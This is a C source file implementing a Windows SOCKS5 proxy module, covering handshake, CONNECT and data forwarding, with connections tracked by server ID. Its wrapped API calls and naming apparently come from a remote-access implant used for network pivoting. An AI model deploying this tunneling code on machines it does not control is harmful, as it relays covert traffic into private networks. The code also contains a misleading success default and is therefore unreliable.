#include "socks.h"
#include "debug.h"
#include "utils.h"

// Initialize Winsock if not already done
static BOOL winsock_initialized = FALSE;

static BOOL init_winsock(VOID) {
    if (winsock_initialized) {
        return TRUE;
    }

    WSADATA wsa_data;
    INT result = API(WSAStartup)(MAKEWORD(2, 2), &wsa_data);
    if (result != 0) {
        _err("WSAStartup failed: %d", result);
        return FALSE;
    }

    winsock_initialized = TRUE;
    _inf("Winsock initialized successfully");
    return TRUE;
}

static BOOL socks_connect(PGS_SOCKS_CONTEXT ctx, UINT32 server_id, PBYTE data, UINT32 data_len, PBYTE *data_out, UINT32 *data_out_len){
    BYTE atyp        = data[3];
    PBYTE ret        = (PBYTE)mcalloc(10); // Allocate failure response buffer
    BOOL ret_val     = TRUE; // Default to failure, set to TRUE on success
    UINT16 target_port;
    CHAR  target_ip[4]; // IPv4 address is 4 bytes 
    
    switch(atyp) {
        case 0x01: // IPv4

            // len check
            if(data_len < 10) {
                _err("SOCKS5 request too short for IPv4");
                // general failure response
                API(RtlMoveMemory)(ret, "\x05\x01\x00\x01\x00\x00\x00\x00\x00\x00", 10);

                goto exit;
            }

            API(RtlCopyMemory)(target_ip, &data[4], 4); // IPv4 address starts at byte 4
            API(RtlCopyMemory)(&target_port, &data[8], 2); // Port starts at byte 8 (already in network byte order)

            break;
        case 0x03: {// Domain
            // len check for domain length 1byte len + N bytes domain + 2 bytes port
            if(data_len < 5) {
                _err("SOCKS5 request too short for domain");
                
                // general failure response
                API(RtlMoveMemory)(ret, "\x05\x01\x00\x01\x00\x00\x00\x00\x00\x00", 10);

                goto exit;
            }
            BYTE domain_len = data[4];
            // len check for domain length + 2 bytes port
            if (data_len < (SIZE_T)(5 + domain_len + 2)) {
                _err("SOCKS5 domain request incomplete");
                // general failure response
                API(RtlMoveMemory)(ret, "\x05\x01\x00\x01\x00\x00\x00\x00\x00\x00", 10);

                goto exit;
            }

            PCHAR domain_name = (PCHAR)mcalloc(domain_len + 1);
            API(RtlCopyMemory)(domain_name, &data[5], domain_len);
            domain_name[domain_len] = '\0';

            struct addrinfo hints, *result = NULL;
            API(RtlZeroMemory)(&hints, sizeof(hints));
            
            hints.ai_family   = AF_INET; // IPv4 only for now
            hints.ai_socktype = SOCK_STREAM;

            INT res = API(getaddrinfo)(domain_name, NULL, &hints, &result);
            
            if (res != 0 || result == NULL) {
                // Host resolution failed
                _err("SOCKS failed to resolve domain: %s", domain_name);
                
                // general failure response
                API(RtlMoveMemory)(ret, "\x05\x01\x00\x01\x00\x00\x00\x00\x00\x00", 10);
                mcfree(domain_name);
                if (result) API(freeaddrinfo)(result);
                
                goto exit;
            }

            struct sockaddr_in *addr = (struct sockaddr_in *)result->ai_addr;
            API(RtlCopyMemory)(target_ip, &addr->sin_addr, 4);

            API(freeaddrinfo)(result); // Free the result after use
            mcfree(domain_name); // Free domain name after use

            API(RtlCopyMemory)(&target_port, data + 5 + domain_len, 2);  // Port is after domain name (already in network byte order)


            break;
        }
        case 0x04: // IPv6
            _err("IPv6 not supported");
            // address type not supported response
            API(RtlMoveMemory)(ret, "\x05\x08\x00\x01\x00\x00\x00\x00\x00\x00", 10);
            goto exit;
            break;
        default:
            _err("Unknown ATYP: 0x%02x", atyp);
            // address type not supported response
            API(RtlMoveMemory)(ret, "\x05\x08\x00\x01\x00\x00\x00\x00\x00\x00", 10);
            goto exit;
            break;
    }

    // Create connection to target
    if(!socks_create_conn(ctx, server_id, target_ip, target_port)) {
        _err("Failed to create connection to target %u.%u.%u.%u:%d", (UINT8)target_ip[0], (UINT8)target_ip[1], (UINT8)target_ip[2], (UINT8)target_ip[3], API(ntohs)(target_port));
        // general failure response
        API(RtlMoveMemory)(ret, "\x05\x01\x00\x01\x00\x00\x00\x00\x00\x00", 10);

        goto exit;
    }

    // Success response
    API(RtlMoveMemory)(ret, "\x05\x00\x00\x01\x00\x00\x00\x00\x00\x00", 10);

    exit:
    ;

    // exit
    
    // Set output parameters
    *data_out     = ret;
    *data_out_len = 10;
    
    return ret_val;
}

static BOOL socks_open_conn(PGS_SOCKS_CONTEXT ctx, UINT32 server_id, PBYTE data, UINT32 data_len, PBYTE *data_out, UINT32 *data_out_len){
    // SOCKS5 header: VER(1) CMD(1) RSV(1) ATYP(1)
    if (data_len < 4) {
        _err("SOCKS5 request too short");
        return FALSE;
    }

    BYTE version = data[0];
    BYTE cmd     = data[1];


    if (version != 0x05) {
        _err("Invalid SOCKS version: 0x%02x", version);
        return FALSE;
    }

    switch (cmd)
    {
    case 0x01: // CONNECT
        return socks_connect(ctx, server_id, data, data_len, data_out, data_out_len); 
        break;
    case 0x02: // BIND
        _err("BIND command not supported");
        goto error_handle;
        break;
    case 0x03: // UDP ASSOCIATE
        _err("UDP ASSOCIATE command not supported");
        goto error_handle;
        break;
    default:
        _err("Unknown command: 0x%02x", cmd);
        goto error_handle;
        break;
    }

    error_handle:
    ;

    PBYTE ret = (PBYTE)mcalloc(10); // Allocate response buffer

    API(RtlMoveMemory)(ret, "\x05\x07\x00\x01\x00\x00\x00\x00\x00\x00", 10);

    *data_out     = ret;
    *data_out_len = 10;

    return TRUE;
}

// Create a new SOCKS connection
BOOL socks_create_conn(PGS_SOCKS_CONTEXT ctx, UINT32 server_id, PCHAR target_ip, UINT16 target_port) {
#ifdef _WIN32 // Ensure Winsock is initialized
    if (!init_winsock()) {
        return FALSE;
    }

    // Create socket
    SOCKET sock = API(WSASocketA)(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (sock == INVALID_SOCKET) {
        _err("Failed to create socket: %d", API(WSAGetLastError)());
        return FALSE;
    }

    // Set non-blocking mode
    u_long mode = 1;
    if (API(ioctlsocket)(sock, FIONBIO, &mode) != 0) {
        _err("Failed to set non-blocking mode: %d", API(WSAGetLastError)());
        API(closesocket)(sock);
        return FALSE;
    }
#endif

    // Resolve target IP/domain
    struct sockaddr_in server_addr;
    API(RtlZeroMemory)(&server_addr, sizeof(server_addr));

    server_addr.sin_family = AF_INET;
    server_addr.sin_port   = target_port;

    API(RtlMoveMemory)(&server_addr.sin_addr, target_ip, 4); // Copy resolved IP to sockaddr_in

    // Connect (non-blocking)
    INT result = API(connect)(sock, (struct sockaddr*)&server_addr, sizeof(server_addr));
    
    if (result == SOCKET_ERROR) {
        INT error = API(WSAGetLastError)();
        if (error != WSAEWOULDBLOCK) {
            _err("Connect failed: %d", error);
            API(closesocket)(sock);
            return FALSE;
        }

        // Wait for connection with timeout
        fd_set write_fds;
        FD_ZERO(&write_fds);
        FD_SET(sock, &write_fds);

        struct timeval timeout;
        timeout.tv_sec = GS_SOCKS_CONNECT_TIMEOUT;
        timeout.tv_usec = 0;

        INT select_result = API(select)(0, NULL, &write_fds, NULL, &timeout);
        if (select_result <= 0) {
            _err("Connection timeout or select failed for %u.%u.%u.%u:%d", (UINT8)target_ip[0], (UINT8)target_ip[1], (UINT8)target_ip[2], (UINT8)target_ip[3], API(ntohs)(target_port));
            API(closesocket)(sock);
            return FALSE;
        }

        // Verify connection actually succeeded using SO_ERROR
        INT sock_error = 0;
        INT error_len = sizeof(sock_error);
        if (API(getsockopt)(sock, SOL_SOCKET, SO_ERROR, (PCHAR)&sock_error, &error_len) != 0) {
            _err("getsockopt failed: %d", API(WSAGetLastError)());
            API(closesocket)(sock);
            return FALSE;
        }

        if (sock_error != 0) {
            _err("Connection failed for %u.%u.%u.%u:%d - error: %d", (UINT8)target_ip[0], (UINT8)target_ip[1], (UINT8)target_ip[2], (UINT8)target_ip[3], API(ntohs)(target_port), sock_error);
            API(closesocket)(sock);
            return FALSE;
        }
    }

    // Allocate new connection structure
    PGLUON_SOCKS_CONN conn = (PGLUON_SOCKS_CONN)mcalloc(sizeof(GLUON_SOCKS_CONN));
    if (conn == NULL) {
        _err("Failed to allocate SOCKS connection");
        API(closesocket)(sock);
        return FALSE;
    }

    conn->server_id  = server_id;
    conn->socket     = sock;
    conn->connected  = TRUE;
    conn->next       = ctx->connections; // Insert at head

    // Update context
    ctx->connections = conn;
    ctx->connection_count++; // Increment connection count

    _inf("Connected to %d.%d.%d.%d:%d with Server ID: %u",
         (unsigned char)target_ip[0], (unsigned char)target_ip[1],
         (unsigned char)target_ip[2], (unsigned char)target_ip[3], API(ntohs)(target_port), server_id);

    return TRUE;
}

// Initialize the SOCKS context
PGS_SOCKS_CONTEXT socks_init() {
    PGS_SOCKS_CONTEXT context = (PGS_SOCKS_CONTEXT)mcalloc(sizeof(GS_SOCKS_CONTEXT));

    // Initialize the CTX
    context->connections = NULL;
    context->connection_count = 0;

    return context;
}

// Find a SOCKS connection by server ID
PGLUON_SOCKS_CONN socks_find_connection(PGS_SOCKS_CONTEXT ctx, UINT32 server_id) {
    PGLUON_SOCKS_CONN current = ctx->connections;
    while (current) {
        if (current->server_id == server_id) {
            return current;
        }
        current = current->next;
    }
    return NULL; // Not found
}

// Remove a SOCKS connection by server ID
BOOL socks_remove(PGS_SOCKS_CONTEXT ctx, UINT32 server_id) {
    PGLUON_SOCKS_CONN current = ctx->connections;
    PGLUON_SOCKS_CONN prev    = NULL;
    while (current) {
        if (current->server_id == server_id) {
            if (prev) {
                prev->next = current->next;
            } else { // Removing head
                ctx->connections = current->next;
            }

            _inf("Removing connection with Server ID: %u", server_id);
            API(closesocket)(current->socket);
            mcfree(current);

            ctx->connection_count--; // Decrement connection count

            return TRUE;
        }
        prev    = current;
        current = current->next;
    }
    return FALSE; // Not found
}

BOOL socks_parse_data(PGS_SOCKS_CONTEXT ctx, UINT32 server_id, PBYTE data, UINT32 data_len, PBYTE *data_out, UINT32 *data_out_len) {
    PGLUON_SOCKS_CONN conn = socks_find_connection(ctx, server_id); // Check if connection exists for server_id
    
    if (conn == NULL){
        // New connection - parse SOCKS5 handshake
        if (data_len == 0) {
            _err("Empty SOCKS5 handshake");
            return FALSE;
        }

        // Check if this is the initial SOCKS5 greeting vs OPEN request
        if (data[0] == 0x05 && data_len >= 2) {
            // If packet is short (< 6 bytes), it's a greeting
            // Otherwise it's a OPEN request
            if (data_len < 6) {
                // This is the initial greeting
                // We don't require authentication, send: VER(0x05) METHOD(0x00 - no auth)
                PBYTE ret = (PBYTE)mcalloc(2);
                API(RtlMoveMemory)(ret, "\x05\x00", 2);

                // Set output parameters
                *data_out     = ret;
                *data_out_len = 2;

                return TRUE;
            } else {
                // This is a CONNECT/BIND/UDP request
                return socks_open_conn(ctx, server_id, data, data_len, data_out, data_out_len);
            }
        }

        _err("Invalid initial SOCKS5 packet");
        return FALSE;

    }else{ // Connection exists - forward data to target socket
        *data_out     = NULL; // No response data for forwarding
        *data_out_len = 0;

        if (data_len > 0) {
            UINT32 total_sent = 0;
            while(total_sent < data_len) {
                INT sent = API(send)(conn->socket, (PCHAR)(data + total_sent), data_len - total_sent, 0);
                if (sent == SOCKET_ERROR) {
                    int err = API(WSAGetLastError)();
                    if (err != WSAEWOULDBLOCK) {
                        _err("Send failed: %d", err);
                        socks_remove(ctx, server_id); // Remove connection on send failure
                        return FALSE;
                    }
                    API(Sleep)(100); // Wait before retrying if socket is not ready
                }else{
                    total_sent += sent;
                }
            }
        }
    }

    return TRUE;
}

BOOL socks_recv_data(PGS_SOCKS_CONTEXT ctx, UINT32 server_id, PBYTE *data_out, UINT32 *data_out_len) {
    PGLUON_SOCKS_CONN conn = socks_find_connection(ctx, server_id);
    
    if (conn == NULL) {
        _err("No connection found for Server ID: %u", server_id);
        return FALSE;
    }

    BOOL closed   = FALSE;
    BOOL errored  = FALSE;
    UINT32 total  = 0;
    PBYTE buffer  = (PBYTE)mcalloc(GS_SOCKS_BUFFER_SIZE);

    while(total < GS_SOCKS_BUFFER_SIZE) {
        INT recv_len  = API(recv)(conn->socket, (PCHAR)(buffer + total), GS_SOCKS_BUFFER_SIZE - total, 0);
        
        if(recv_len > 0){
            total += recv_len;
            continue; // Keep reading until buffer is full or no more data
        } else if(recv_len == 0) {
            closed = TRUE;
            break;
        } 
        
        if(API(WSAGetLastError)() != WSAEWOULDBLOCK) {
            errored = TRUE;
        }
        break; // No more data to read
    }
    
    // Initialize output parameters to default in case of error/closure
    *data_out     = NULL;
    *data_out_len = 0;

    if( errored || closed ) {
        // Connection broken, remove and notify
        socks_remove(ctx, server_id);
        mcfree(buffer);
        return FALSE;
    }

    if (total > 0) {
        _inf("Received %u bytes from socket (server_id=%u)", total, server_id);
        *data_out     = buffer;
        *data_out_len = total;
        
        return TRUE;
    }

    mcfree(buffer);
    return TRUE;
}
